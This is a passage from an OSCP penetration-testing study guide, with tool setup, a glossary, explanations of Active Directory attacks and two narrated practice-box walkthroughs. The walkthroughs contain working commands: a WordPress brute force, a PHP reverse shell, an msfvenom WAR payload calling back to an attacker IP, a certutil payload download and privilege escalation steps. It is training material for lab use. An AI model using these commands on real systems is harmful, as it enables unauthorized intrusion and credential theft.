## 4) Build a `~/tools` folder of things you copy TO targets
These aren't apt packages — they're scripts/binaries you download once, then serve to the victim with a web server. **Download from the official GitHub "Releases" pages.**
```
mkdir -p ~/tools/{linux,windows}
# LINUX enumeration/privesc (put in ~/tools/linux):
#   linpeas.sh          (PEASS-ng releases)
#   pspy64              (DominicBreuker/pspy releases)
#   chisel (linux amd64), agent/proxy for ligolo-ng (linux)
# WINDOWS enumeration/privesc (put in ~/tools/windows):
#   winPEASx64.exe      (PEASS-ng releases)
#   PrintSpoofer64.exe  (itm4n/PrintSpoofer releases)
#   GodPotato-NET4.exe  (BeichenDream/GodPotato releases)
#   nc.exe              (netcat for windows)
#   chisel.exe, ligolo agent.exe (windows amd64)
#   PowerView.ps1, PowerUp.ps1, SharpHound.exe, mimikatz.exe
```
Grab them once with your browser or `wget <release-url> -O ~/tools/linux/linpeas.sh`. (Exact URLs change with versions — search "linpeas releases" etc.)

## 5) Serve tools to a target (you'll do this constantly)
```
cd ~/tools/linux && python3 -m http.server 80          # then on target: wget http://$IP/linpeas.sh
# your $IP = your VPN address:  ip addr show tun0
```

## 6) Per-target folders (make one per box)
```
mkdir -p ~/oscp/target1/{scans,loot,exploits,www} && cd ~/oscp/target1
```

## 7) Nice-to-have quality-of-life
```
# fix rockyou path habit, add a quick alias to your ~/.zshrc:
echo 'alias serve="python3 -m http.server 80"' >> ~/.zshrc
echo 'alias tun="ip addr show tun0 | grep inet"' >> ~/.zshrc
source ~/.zshrc
# BloodHound GUI (for AD): install per current docs (BloodHound CE / neo4j)
```
✅ **You're ready.** You never need to redo this except updating tools occasionally.

---

# [GLOSSARY]  📖 plain-English jargon (what these words actually mean)

**Enumeration** — thoroughly poking a target to discover everything about it (open ports, services, versions, files, users). 80% of the exam. "Enumerate" = "investigate/list."

**Foothold / Initial access** — your *first* way to run commands on the target (a shell or code execution). Getting "in."

**Shell** — an interactive command prompt on the target. Your goal on every box.
- **Reverse shell** — the *target* connects back to *you*. (You run a listener; the target dials out.) Most common.
- **Bind shell** — the *target* opens a port and *you* connect to it. Used when the target can't dial out.
- **Webshell** — a script (e.g. PHP) you upload to a web server that runs commands via the browser.

**Listener** — a program on *your* Kali waiting for the target's reverse shell to connect. Usually `nc -lvnp 443`.

**Payload** — the code that gives you a shell (e.g. a reverse-shell one-liner, or a `.exe` from msfvenom).

**LHOST / LPORT** — *your* IP and port (where the shell comes back to). **RHOST / RPORT** — the *target's* IP and port.

**TTY / "stabilize the shell"** — upgrading a clunky shell into a proper interactive one (arrow keys, tab-complete, Ctrl-C don't kill it). See `[SHELL-QUICK]`.

**Privilege escalation (privesc)** — going from a low-power user to **root** (Linux) or **SYSTEM/Administrator** (Windows). The second 10 points on each box.

**Lateral movement** — using creds/hashes from one machine to get into *another* machine (same network). Core of AD.

**Pivoting** — routing your tools *through* a compromised machine to reach a network you can't touch directly. See `[PIVOT-QUICK]`.

**Enumeration vs Exploitation** — first you *find* the weakness (enum), then you *use* it (exploit).

**CVE** — a public ID for a known vulnerability (e.g. CVE-2021-4034). **PoC / Exploit** — code that abuses a vulnerability. See `[CVE-HITS]`.

**Hash** — a scrambled (one-way) version of a password. You "crack" it (guess the original) with a wordlist, or sometimes *use it directly* (Pass-the-Hash).
- **NTLM** — Windows password hash. **NetNTLMv2** — a hash captured from network authentication (e.g. by Responder).
- **Pass-the-Hash (PtH)** — logging in with the NTLM hash itself, no need to crack it.

**Wordlist** — a big text file of guesses (passwords or paths). `rockyou.txt` is the famous one.
- **Brute force** — trying many passwords against one account. **Password spraying** — trying *one* password against *many* accounts (safer re: lockouts).

**Active Directory (AD)** — Microsoft's system for managing users/computers in a Windows network. The 40-point exam set. Key pieces:
- **Domain Controller (DC)** — the server that runs AD (holds all accounts). Own it = own the domain.
- **Kerberos / TGT / TGS** — AD's login ticket system. **Kerberoasting** = get crackable hashes of service accounts. **AS-REP roasting** = get crackable hashes of users with a specific weak setting.
- **DCSync** — asking the DC to hand over all password hashes (needs high privilege). Game over.
- **BloodHound** — a tool that maps AD and draws the shortest path to Domain Admin.

**SMB (445)** — Windows file sharing + the protocol used for tons of AD attacks. **LDAP (389)** — the "phone book" query protocol for AD.

**Web vulns (quick defs):** **LFI** = read local files via a web param. **RFI** = include a remote file → code exec. **SQLi** = inject SQL to read the database. **SSTI** = inject template code → exec. **SSRF** = make the server fetch a URL for you. **XXE** = abuse XML parsing to read files. **IDOR** = access other users' data by changing an ID. **Command injection** = your input reaches the OS shell.

**SUID** — a Linux file flag letting a program run as its owner (often root) → privesc if abusable. **sudo** — run a command as another user (usually root). **Capability** — a fine-grained Linux root-power on a binary. **Cron** — scheduled tasks (often run as root).

**proxychains / SOCKS** — tools/protocol to send your commands through a pivot. **vhost** — a website served based on the hostname (add to `/etc/hosts`). **subnet** — a range of IPs (e.g. `172.16.5.0/24`).

**local.txt / proof.txt** — the flag files. `local.txt` = proof of low-priv access (10 pts). `proof.txt` = proof of root/SYSTEM (10 pts).

**Revert** — reset a target to a clean state (free; do it if a box acts broken). **Rabbit hole** — a dead-end you waste time on; the exam's biggest trap.

---

# [CONCEPTS]  🧠 how it actually works (theory → why the attack works)
> The `[GLOSSARY]` gives one-liners; this gives the *understanding*. Each concept ends with **the attack it enables** — that's the point of learning it. This is the theory layer PEN-200 assumes.

## Windows / AD authentication — the big picture
Windows proves *who you are* with one of two protocols: **NTLM** (older, challenge-response) or **Kerberos** (AD default, ticket-based). Both ultimately rely on a **password hash**, never the plaintext. Understand these two + how they store/pass secrets and 80% of AD "clicks."

## [CONCEPT-NTLM]  NTLM & the NT hash
- Your password is stored as an **NT hash** (unsalted MD4 of the password) in the SAM (local) or NTDS.dit (domain).
- **NTLM authentication** is challenge-response: server sends a challenge, client encrypts it with the NT hash → server verifies. The plaintext never crosses the wire; the **NT hash itself is the secret**.
- **→ Attack (Pass-the-Hash):** because the NT hash *is* the credential, if you steal it you can authenticate **without cracking it** (`nxc -H`, `evil-winrm -H`, `psexec -hashes`). This is why dumping SAM/LSASS is game-changing.
- **NetNTLMv1/v2** = the hash of the *challenge-response* captured on the wire (Responder). It's **NOT** the NT hash — you can't PtH it; you **crack** it (`-m 5600`) or **relay** it.

## [CONCEPT-KERBEROS]  Kerberos — tickets, TGT, TGS
The DC runs a **KDC**. Flow: (1) you prove yourself to the KDC and get a **TGT** (Ticket-Granting Ticket) — encrypted with the *krbtgt* account's key; (2) you present the TGT to ask for a **TGS** (service ticket) for a specific service — encrypted with *that service account's* key; (3) you present the TGS to the service, which decrypts it to trust you.
- **→ Kerberoasting:** *anyone* can request a TGS for any service with an **SPN**. The TGS is encrypted with the **service account's password hash** → request it, crack it offline (`-m 13100`). Works because you don't need to reach the service, just ask the KDC.
- **→ AS-REP roasting:** if a user has "pre-auth disabled," the KDC's **AS-REP** is encrypted with *their* hash and handed out with no proof of identity → crack it (`-m 18200`). No credentials needed.
- **→ Pass-the-Ticket / Overpass-the-Hash:** steal or forge a TGT/TGS and inject it (`KRB5CCNAME`). **Golden Ticket** = forge *any* TGT using the stolen **krbtgt** hash (total domain forge). **Silver Ticket** = forge a TGS for one service using that service's hash.

## [CONCEPT-SPN]  Service Principal Name (SPN)
An SPN maps a **service instance** (e.g. `MSSQL/db01.corp.local`) to the **account that runs it**. Kerberos uses it to pick which account's key encrypts the TGS. **→ Attack:** accounts *with* an SPN are Kerberoastable — and service accounts are often high-privilege with weak passwords. `GetUserSPNs` lists them.

## [CONCEPT-SID]  SID & RID  → full detail in `[AD-SID]`
A **SID** (`S-R-X-Y`) uniquely identifies every principal; the last number is the **RID**. The domain SID + a RID = a specific user. **→ Attacks:** RID cycling enumerates users; the domain SID is needed to forge tickets.

## [CONCEPT-TOKENS]  Windows access tokens
When you log in, Windows builds an **access token** describing your privileges/SIDs; every process carries a copy. Two kinds: **primary** (attached to a process) and **impersonation** (lets a thread act as another user — how services handle client requests).
- **→ Attack (SeImpersonate → Potato):** a service account with **SeImpersonatePrivilege** can impersonate any token it's handed. The "Potato" exploits trick a **SYSTEM** process into authenticating to the attacker, then impersonate its token → become SYSTEM. This is why SeImpersonate on IIS/MSSQL/service accounts is an instant win.

## [CONCEPT-AD-STRUCTURE]  Domain, DC, Forest, OU, GPO, GC
- **Domain** = a boundary of users/computers sharing a database. **Domain Controller (DC)** = the server holding it (AD DS) + the KDC. Own the DC = own the domain.
- **Forest** = one or more domains sharing a schema/trust (the top security boundary). **OU** = a folder for organizing/​delegating objects. **GPO** = Group Policy, pushes settings/scripts to machines (abusable if you can edit one). **Global Catalog (GC, 3268)** = a forest-wide searchable index of objects.

## [CONCEPT-LDAP]  LDAP vs AD
**AD** is the database; **LDAP** (389/636) is the *protocol* you query it with. Users, groups, computers, their attributes (incl. `description`, SPNs, `msDS-*` flags) all live in LDAP. **→ Attack:** anonymous/authed LDAP dumps the whole directory — users, roastable accounts, delegation flags, sometimes passwords in `description`.

## [CONCEPT-DELEGATION]  Delegation (why it's abusable)
Delegation lets a service act **on behalf of** a user to reach another service (e.g. web server → DB as *you*). **Unconstrained** = the service caches your full TGT (compromise it → steal any TGT that touches it). **Constrained** = limited to named services (S4U abuse to impersonate anyone to those). **RBCD** = the *target* says who may delegate to it (write that attribute → impersonate admin to it). All three end in "impersonate a privileged user."

## [CONCEPT-DCSYNC]  DCSync / replication
DCs sync their databases using the **Directory Replication Service** protocol. **→ Attack:** any principal granted *Replicating Directory Changes* rights (Domain Admins, or a delegated account BloodHound flags) can **ask a DC to replicate password hashes** — including **krbtgt** and **Administrator** — without touching disk. `secretsdump` does this. It's the usual "game over."

## [CONCEPT-HASHES]  hash types — crack vs. pass
- **NT hash** (Windows, 32 hex): **pass it** (PtH) or crack (`-m 1000`).
- **NetNTLMv2** (Responder capture): **crack** (`-m 5600`) or relay — cannot PtH.
- **Kerberos** TGS (`-m 13100`) / AS-REP (`-m 18200`): **crack** only.
- **Linux** `$6$` sha512crypt (`-m 1800`), `$1$` md5crypt (`-m 500`), bcrypt `$2$` (`-m 3200`): crack from `/etc/shadow`.
- **Golden rule:** if it's an NT hash, **try passing it before wasting time cracking**.

## [CONCEPT-LINUX-PERMS]  SUID/SGID, sudo, capabilities (what they *are*)
- **SUID/SGID** bit: a program runs as its **owner/group** (often root) regardless of who launches it — designed for tools like `passwd`. **→ Attack:** a SUID binary that can run commands/read/write (GTFOBins) does so *as root*.
- **sudo**: runs a command as another user per `/etc/sudoers`. **→ Attack:** a permitted binary with a shell escape (GTFOBins) = root.
- **Capabilities**: fine-grained slices of root power on a binary (e.g. `cap_setuid`). **→ Attack:** `cap_setuid` on python = instant root.

## [CONCEPT-WEB-AUTH]  sessions, cookies, JWT
HTTP is stateless, so after login the server issues a **session** identified by a **cookie**. **JWT** = a self-contained signed token (header.payload.signature) the server trusts if the signature checks. **→ Attacks:** steal/forge the cookie (IDOR/tamper `role=admin`), or forge a JWT (weak HMAC secret → crack + re-sign, or `alg:none`).

---

# [FIRST-BOX-WALKTHROUGH]  🎬 see it all connect (two full examples)

> These are **representative** easy boxes (made-up IPs, not real exam machines) narrated the way an experienced tester thinks. Follow the *reasoning*, not just the commands.

## Example A — a typical easy LINUX box  (target `192.168.150.50`)

**① Setup + scan** (`[NMAP-QUICK]`)
```
mkdir -p ~/oscp/box50/{scans,loot} && cd ~/oscp/box50
T=192.168.150.50
nmap -p- --min-rate 2000 -Pn -oN scans/all.txt $T
# → shows: 22 (ssh), 80 (http)
nmap -p22,80 -sCV -Pn -oN scans/scv.txt $T
# → 22 OpenSSH 8.2p1 Ubuntu ; 80 Apache 2.4.41, title "Meridian Blog"
```
*Think:* Only 22 and 80. SSH is rarely the way in by itself — **the web server is my target** (Golden Rule: web gets full attention).

**② Web enumeration** (`[WEB-QUICK]`)
```
whatweb http://$T                 # → WordPress 5.7.2, PHP
curl -s http://$T/robots.txt      # → /wp-admin/, nothing juicy
feroxbuster -u http://$T -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
# → /wp-login.php, /wp-content/, /uploads/
```
*Think:* It's WordPress. Two cheap moves: (a) scan for vulnerable plugins with `wpscan`, (b) try weak admin creds.
```
wpscan --url http://$T --enumerate vp,u              # → user "admin"; plugin "photo-gallery 1.5.35"
searchsploit photo-gallery 1.5.35                     # → an exploit exists? or check the users
```
Say wpscan found user **admin** but no easy plugin RCE. Try a small password guess (evidence: it's an easy box):
```
wpscan --url http://$T -U admin -P /usr/share/wordlists/rockyou.txt   # → password: "sunshine1"
```

**③ Foothold** (`[FOOTHOLD-CHECKLIST]`, WordPress trick from `[ADDENDUM-WEB-CMS]`)
Log into `/wp-admin` as `admin:sunshine1`. WordPress admins can edit theme PHP → instant RCE:
- Appearance → Theme Editor → edit `404.php`, paste a PHP reverse shell (`[SHELL-LINUX]`), set `LHOST` = your `tun0` IP, port 443.
```
ip addr show tun0        # → my IP is 10.10.14.7  (this is LHOST)
nc -lvnp 443             # start listener BEFORE triggering
curl http://$T/wp-content/themes/<theme>/404.php     # trigger the shell
# → listener catches a connection: "www-data@meridian"
```

**④ Stabilize** (`[SHELL-QUICK]`)
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z
stty raw -echo; fg
# (Enter twice)
export TERM=xterm
```

**⑤ Grab the first flag NOW** (10 pts banked)
```
find / -name local.txt 2>/dev/null      # → /home/jenny/local.txt  (or user's home)
cat /home/jenny/local.txt ; id ; ip a   # → SCREENSHOT all three together
```
*(Some Linux boxes only have proof.txt; grab whatever flag is present as low-priv.)*

**⑥ Local enum → privesc** (`[LINUX-PRIVESC-QUICK]`)
```
id                          # www-data
sudo -l                     # → (nothing / needs password)
find / -perm -4000 -type f 2>/dev/null    # SUID list
# also loot WP config for creds:
cat /var/www/html/wp-config.php | grep -i pass   # → DB pass "S3cureDB!" → try it as jenny/other users
su jenny                    # try reused password → success? now you're jenny
sudo -l                     # as jenny → (ALL) NOPASSWD: /usr/bin/find
```
*Think:* `sudo find` with NOPASSWD → straight to `[LINUX-SUDO]` / GTFOBins:
```
sudo find . -exec /bin/bash \; -quit         # GTFOBins "find" sudo escape → root shell
id                                            # uid=0(root)
```

**⑦ Root flag** (10 pts)
```
cat /root/proof.txt ; id ; ip a              # → SCREENSHOT all three
```
**Done: 20/20.** Loot `/etc/shadow`, SSH keys, and any other creds for the rest of the exam.

---

## Example B — a typical easy WINDOWS box  (target `192.168.150.60`)

**① Scan**
```
T=192.168.150.60
nmap -p- --min-rate 2000 -Pn -oN scans/all.txt $T      # → 135,139,445,3389,5985,8080
nmap -p135,139,445,3389,5985,8080 -sCV -Pn -oN scans/scv.txt $T
# → 445 SMB, 5985 WinRM, 8080 Apache Tomcat 9.0.30
```
*Think:* SMB to check, and **Tomcat on 8080** — Tomcat with default creds = deploy a WAR = shell.

**② Enumerate**
```
nxc smb $T -u '' -p '' --shares          # null session → maybe a readable share
# Tomcat: browse http://$T:8080/  → /manager/html asks for login
# try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret
```
Say `tomcat:s3cret` works on `/manager/html`.

**③ Foothold** (`[WEB-UPLOAD]` → Tomcat WAR)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f war -o shell.war
# upload shell.war via Tomcat Manager "Deploy" → it appears as an app
nc -lvnp 443
curl http://$T:8080/shell/                # browse the deployed app → triggers shell
# → shell as "tomcat" service account on WIN-BOX
```

**④ First flag NOW**
```
whoami                                   # tomcat
type C:\Users\tomcat\Desktop\local.txt & whoami & ipconfig     # SCREENSHOT together
```

**⑤ Privesc** (`[WINDOWS-PRIVESC-QUICK]`)
```
whoami /priv
# → SeImpersonatePrivilege  Enabled   ← service accounts usually have this!
```
*Think:* SeImpersonate → **Potato attack** → SYSTEM (`[WINDOWS-TOKENS]`). Transfer PrintSpoofer:
```
# on Kali:  cd ~/tools/windows && python3 -m http.server 80
# on target:
certutil -urlcache -split -f http://10.10.14.7/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
C:\Windows\Temp\ps.exe -i -c "cmd"       # → whoami = nt authority\system
```

**⑥ Root flag**
```
type C:\Users\Administrator\Desktop\proof.txt & whoami & ipconfig   # SCREENSHOT
```
**Done: 20/20.** Then `secretsdump`/loot creds for lateral movement / the AD set.

---

## What both walkthroughs teach (the pattern behind every box)
```
SCAN everything  →  pick the most promising service  →  ENUMERATE it fully
→  cheap foothold (default/weak creds > known exploit > web vuln)
→  STABILIZE shell  →  grab + screenshot the low-priv flag IMMEDIATELY
→  local enum (sudo -l / whoami /priv first!)  →  the ONE quick-win privesc
→  root/SYSTEM  →  screenshot proof  →  LOOT creds for the next box
```
Every box is a variation of this. The guide's job is to answer "what do I check next?" at each arrow. Now go do easy boxes on Proving Grounds / HTB and run this loop until it's automatic. `[BEGINNER-START-HERE]`

---

# [STUDY-TRACKER]  📊 turn practice into a pass

> **The KB is content-complete — reps are what's left.** This tracker makes your practice *measurable* so you drill the right thing instead of grinding random boxes. There's an **interactive version** (`OSCP-Study-Tracker.html`) that saves to your browser and auto-charts your weakest stage. Below is the paper/markdown version if you prefer.

## How it works
1. After **every** practice box, log one row — honestly.
2. The field that matters most is **“Where I got stuck”** — that's your weak-signal.
3. After ~15 boxes, whichever stage has the most “stuck” marks is **exactly what to drill next**.
4. Target **~40–60 boxes, AD-weighted** (aim ≥30% AD/Windows). When you can root PG-intermediate boxes without hints, you're ready.

## Per-box row (copy this table into your notes / use the interactive HTML)
```
| Date | Box | Source | OS(L/W/AD) | Diff | Result(Root/Foothold/Fail) | TTF(min) | Foothold vector | Privesc vector | Hints(None/Some/Heavy) | STUCK stage | What I missed | Lesson |
```
Example filled row:
```
| 2026-08-21 | Meridian | PG | L | Easy | Root | 40 | Web-WP theme RCE | sudo find (GTFOBins) | None | Nowhere | — | always sudo -l before anything |
| 2026-08-22 | Heist    | PG | W | Med  | Foothold | 65 | Cred reuse | (stuck) | Heavy | Windows privesc | missed SeImpersonate→Potato | whoami /priv FIRST on Windows |
```

## Weak-area tally (tick each time a box got you stuck there)
```
Enumeration        : ....................   → drill [NMAP-QUICK] [ENUM-DECISION]
Web exploitation   : ....................   → drill [WEB-QUICK] [SQLI]
Foothold/access    : ....................   → drill [FOOTHOLD-CHECKLIST] [EXPLOIT-RESEARCH]
Linux privesc      : ....................   → drill [LINUX-PRIVESC-QUICK]
Windows privesc    : ....................   → drill [WINDOWS-PRIVESC-QUICK]
Active Directory   : ....................   → drill [AD-QUICK] [AD-ATTACK-PATH]
Pivoting           : ....................   → drill [PIVOT-QUICK]
Reporting          : ....................   → drill [REPORTING]
```
Tallest column = your next 5 boxes' focus. Re-check every ~10 boxes; the goal is to watch your tall bar shrink.

## Readiness gate (don't schedule until all true)
```
[ ] Rooted 40–60+ boxes, ≥30% Windows/AD
[ ] Can root a PG-intermediate box start→proof with NO hints
[ ] Ran ≥5 full AD chains (enum→BloodHound→roast→lateral→DC) unaided
[ ] Pivoted through a host (Ligolo/Chisel) at least a few times
[ ] Wrote ≥1 practice report with screenshots + repro from your notes
[ ] Your weak-area radar has no single dominant tall bar left
```

---
*End Volume 9 & the Knowledge Base. Foundations (Vol 9) → methodology (Vol 0) → techniques (Vol 1–5) → lookups (Vol 6) → syllabus+flow (Vol 7) → war room (Vol 8). Now go log boxes in `[STUDY-TRACKER]` and clear it. 🎯*


# OSCP+ KNOWLEDGE BASE — VOLUME 0
## MASTER INDEX · MINDSET · MASTER METHODOLOGY · TIME · REPORTING · PREP

> **How to use this KB:** Everything is tagged like `[SMB-ENUM]`. To find something, `Ctrl+F` the tag or the plain word. Tags are stable across all volumes so you can merge them into one file later (`cat VOL-*.md > OSCP-KB-COMPLETE.md`).
>
> **Source labels used everywhere:**
> `[OFFICIAL OFFSEC]` = from OffSec's own docs/exam guide. `[COMMUNITY]` = repeatedly reported by recent candidates. `[GENERAL]` = standard pentest knowledge/tool docs.
>
> **Info levels:** every big topic has `[QUICK]` (first 30–60s), `[PRACTICAL]` (the actual methodology — most of the value), `[DEEP]` (theory/edge cases — never blocks action).
>
> **Command labels:** `[MUST-MEMORIZE]` (you type it constantly), `[MUST-RECOGNIZE]` (know what it does, look up exact syntax), `[LOOK-UP]` (never memorize, just know it exists).
>
> **📦 Companion files (same folder):** `OSCP-Flowcharts.html` (9 visual attack-flow diagrams — see the next move), `OSCP-CommandGen.html` (click-to-generate any command with your IP filled in), `OSCP-Study-Tracker.html` (log practice boxes → your weakest stage), `oscp.sh` / `oscp.py` (exam-safe automation helper — `[EXAM-SCRIPTS]`). Use the **flowchart/generator for the move & command**, this KB for the **why & detail**.

---

# [NOOB-PRIMER]  👶 READ THIS FIRST if you're new

New to this? These 6 things confuse *everyone* at the start. Learn them once and every command in this guide makes sense.

## 1) `$IP`, `$T`, `$U`, `$P` are PLACEHOLDERS — you replace them
When you see `nmap -p- $T` or `ssh $U@$IP`, you don't type the dollar-sign words literally. You swap in real values:
```
$IP  = YOUR Kali VPN address (see #4)      $T = the TARGET's IP (e.g. 192.168.1.50)
$U   = a username           $P = a password            $DC = domain controller IP
$DOMAIN = domain name (e.g. corp.local)    $H = an NTLM hash
```
So `evil-winrm -i $T -u $U -p $P` becomes `evil-winrm -i 192.168.1.50 -u bob -p Summer2025!`.
*(Tip: set them as shell variables so copy-paste works: `T=192.168.1.50`, then `nmap -p- $T` runs for real.)*
- **Change a value:** just assign again — `T=192.168.1.77` overwrites the old one. `export IP=10.10.14.8` updates your Kali IP.
- **Check a value:** `echo $T` / `echo $IP` (blank line = not set in this terminal).
- **⚠️ Per-terminal:** variables only exist in the tab you set them in. New tab → they're empty → set again. Best practice: **one box per terminal tab**, set `T` at the top of each tab. Clear one with `unset T`.

## 2) `[FILE-CONVENTIONS]` TWO kinds of files: ones Kali gives you vs ones YOU create
This is the `hashcat -m 5600 netntlmv2.txt rockyou.txt` confusion. The two files are totally different:

| **Ships WITH Kali** (already there, use it) | **YOU create** (save it from the target) |
|---|---|
| `rockyou.txt` → `/usr/share/wordlists/rockyou.txt` | hash files: `netntlmv2.txt`, `tgs.txt`, `asrep.txt` |
| SecLists → `/usr/share/seclists/…` | user lists you found: `users.txt` |
| dir wordlists → `/usr/share/wordlists/dirb/`, `dirbuster/` | anything holding loot from the box |

**Rule of thumb:** in `hashcat -m <mode> <A> <B>` and similar, **the left file (A) is something you made from the target (a hash), the right file (B) is a wordlist Kali provides.** Same for `GetNPUsers -usersfile users.txt` (users.txt = YOUR list) and `hydra -P rockyou.txt` (Kali's list).

**To create a file** you just save text into it:
```
nano netntlmv2.txt                 # opens editor → paste the hash → Ctrl+O save, Ctrl+X exit
echo 'the-hash-here' > hash.txt    # or write it directly
```

**A THIRD kind — OUTPUT files (tools create them for you).** In `nmap ... -oN scans/all-tcp.txt`, that `.txt` is an **output** file — nmap *writes* it when it runs; you don't have it beforehand. Same for any `-o`/`--output`/`>` redirect. So there are three file types total:
```
INPUT, Kali provides   → /usr/share/wordlists/rockyou.txt , SecLists   (you point tools at these)
INPUT, you create      → users.txt , hash.txt                          (you save target loot into these)
OUTPUT, tool creates   → scans/all-tcp.txt (nmap -oN) , loot dumps      (appear AFTER the tool runs)
```
⚠️ **Gotcha:** an output path like `scans/all-tcp.txt` needs the **`scans/` folder to already exist**, or you get `Failed to open ... No such file or directory`. Make it first: `mkdir -p scans` (that's why `[KALI-SETUP]` pre-creates `~/oscp/<box>/{scans,loot,...}`). Or just write to the current dir: `-oN all-tcp.txt`.

## 3) `rockyou.txt` is GZIPPED on a fresh Kali — unzip it once
```
sudo gunzip /usr/share/wordlists/rockyou.txt.gz      # do this one time, ever
# folder empty? install them:  sudo apt install wordlists seclists
```
After that, always point to the full path: `/usr/share/wordlists/rockyou.txt` (writing just `rockyou.txt` only works if you're in that folder).

## 4) `LHOST` / your `$IP` = your VPN address, NOT your home IP
In reverse shells and exploits, "your IP" means your **tun0** (the exam/lab VPN interface), e.g. `10.10.14.x`. Find it:
```
ip addr show tun0        # look for the "inet" line  → that's your $IP / LHOST
```
Using the wrong IP (like eth0) is the #1 reason reverse shells never connect (`[REVERSE-SHELL-NOT-CONNECTING]`).

## 5) `sudo` = run as admin on YOUR Kali; `-Pn`, `-p-` etc. are FLAGS
- `sudo <cmd>` runs a command with root on **your own** Kali (needed for nmap SYN scans, binding low ports). It has nothing to do with the target.
- Words starting with `-` (like `-p-`, `-sCV`, `-u`) are **flags/options** that change how a tool behaves. `[NMAP-QUICK]` explains the ones you need.

## 6) How to read any command in this guide
```
tool      -flag value      $PLACEHOLDER      file
  │           │                 │              │
which     options you       you replace    a wordlist (Kali's)
program   rarely change     with real IP   or a file you made
```
Example: `nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $T`
= run **nmap**, scan **all ports** (`-p-`), fast (`--min-rate 2000`), skip ping (`-Pn`), **save output** to `scans/all-tcp.txt` (`-oN`), against **the target** (`$T`).

> **You don't need to memorize commands.** You need to (a) recognize what a command *does*, (b) know where to find it here, and (c) swap in your real values. Do boxes, keep this open, and it becomes automatic. Now go to `[BEGINNER-START-HERE]` (Vol 7) for the learning order.

---

# [MASTER-INDEX]

> **Reading order vs. IDs:** The sidebar/steps ①–⑩ below are the order to *use* this KB. The "Volume N" in each title is a **stable ID** that cross-references point to (they don't change when the order does). Follow the ① ② ③ steps; ignore the raw numbers unless you're chasing a `(Vol N)` pointer.

**① ⭐ EXAM WAR ROOM** *(Volume 8 — open FIRST on exam day)*: `[EXAM-WAR-ROOM]` single pane of glass (scoreboard, 3 machine playbooks, hour checkpoints, quick-wins), `[CVE-HITS]`, `[COMMUNITY-ADDENDUM]`, `[BOF-DEPRECATED]`.

**② 👶 FOUNDATIONS** *(Volume 9 — start here if new)*: `[KALI-SETUP]`, `[GLOSSARY]`, `[FIRST-BOX-WALKTHROUGH]` (full Linux + Windows boxes narrated).

**③ 🧭 MINDSET & METHODOLOGY** *(Volume 0 — this file)*: `[NOOB-PRIMER]`, `[OSCP-GOLDEN-RULES]`, `[MASTER-METHODOLOGY]` (stages 0–18), `[PENTESTER-THOUGHT-PROCESS]`, `[TIME-MANAGEMENT]`, `[REPORTING]`, `[MINIMUM-VIABLE-PREP]`, `[7-DAY-PLAN]`, `[READINESS-TEST]`, `[CURRENT-OSCP+]`.

**④ 🔎 ENUMERATION & NMAP** *(Volume 1)*: `[NMAP-*]`, `[ENUM-*]` per service (FTP, SSH, SMTP, DNS, HTTP, SMB, RPC, LDAP, KERBEROS, WINRM, RDP, SNMP, NFS, MSSQL, MYSQL, POSTGRES, REDIS, MONGODB, GIT, unusual ports), `[ENUM-DECISION]`.

**⑤ 🌐 WEB & SQLi** *(Volume 2)*: `[WEB-*]` full methodology + every web vuln; `[SQLI-*]` mini-course (MySQL/MSSQL/Postgres/SQLite).

**⑥ 💥 ACCESS · SHELLS · TRANSFER · CREDS** *(Volume 3)*: `[FOOTHOLD-*]`, `[SHELL-*]`, `[FILETRANSFER-*]`, `[CREDENTIALS-*]`, `[HASH-*]`, `[EXPLOIT-RESEARCH]`.

**⑦ ⬆️ PRIVILEGE ESCALATION** *(Volume 4)*: `[LINUX-PRIVESC-*]`, `[WINDOWS-PRIVESC-*]`.

**⑧ 🏰 ACTIVE DIRECTORY & PIVOTING** *(Volume 5)*: `[AD-*]`, `[PIVOT-*]`.

**⑨ 🧰 FOUND-X · TROUBLESHOOTING · TOOLBOX** *(Volume 6)*: `[FOUND-*]` ("I found X, what now"), `[RABBITHOLE-*]`, `[STUCK-PROTOCOL]`, `[TROUBLESHOOTING-*]`, `[CHAIN-*]`, `[TECH-*]` encyclopedia, `[TOOL-*]` toolbox, `[MACHINE-JOURNAL]`, Top-100s / final-day reference.

**⑩ 📚 SYLLABUS EXTRAS & EXAM FLOW** *(Volume 7)*: `[EXAM-DAY-FLOW]`, `[BEGINNER-START-HERE]`, `[SYLLABUS-MAP]`, `[CLIENTSIDE-*]`, `[PHISHING]`, `[FIXING-EXPLOITS]`, `[AV-EVASION]`, `[TOOL-MSF]`, `[DPI-TUNNELING]`, `[CLOUD-AWS]`.

### Predictable tag families (search any of these)
```
[NMAP] [NMAP-QUICK] [NMAP-TCP] [NMAP-UDP] [NMAP-SCRIPTS] [NMAP-TROUBLESHOOTING]
[ENUM-FTP] [ENUM-SSH] [ENUM-SMTP] [ENUM-DNS] [ENUM-HTTP] [ENUM-SMB] [ENUM-RPC]
[ENUM-LDAP] [ENUM-KERBEROS] [ENUM-WINRM] [ENUM-RDP] [ENUM-SNMP] [ENUM-NFS]
[ENUM-MSSQL] [ENUM-MYSQL] [ENUM-POSTGRES] [ENUM-REDIS] [ENUM-MONGODB] [ENUM-GIT]
[SMB-QUICK] [SMB-ENUM] [SMB-ATTACK] [SMB-TROUBLESHOOTING]
[WEB-QUICK] [WEB-FINGERPRINT] [WEB-CONTENT] [WEB-LFI] [WEB-RFI] [WEB-SSRF]
[WEB-CMDINJ] [WEB-SSTI] [WEB-XXE] [WEB-UPLOAD] [WEB-DESERIALIZE] [WEB-IDOR] [WEB-JWT] [WEB-AUTHBYPASS]
[SQLI] [SQLI-QUICK] [SQLI-DECISION-TREE] [SQLI-MYSQL] [SQLI-MSSQL] [SQLI-POSTGRES] [SQLI-SQLITE] [SQLI-SQLMAP] [SQLI-TROUBLESHOOTING]
[FOOTHOLD-CHECKLIST] [SHELL-QUICK] [REVERSE-SHELL-NOT-CONNECTING] [FILETRANSFER-QUICK]
[LINUX-PRIVESC-QUICK] [LINUX-SUDO] [LINUX-SUID] [LINUX-CRON] [LINUX-CAP] [LINUX-PATH] [LINPEAS-WORKFLOW] [GTFOBINS-WORKFLOW]
[WINDOWS-PRIVESC-QUICK] [WINDOWS-SERVICES] [WINDOWS-TOKENS] [WINDOWS-CREDS] [WINPEAS-WORKFLOW]
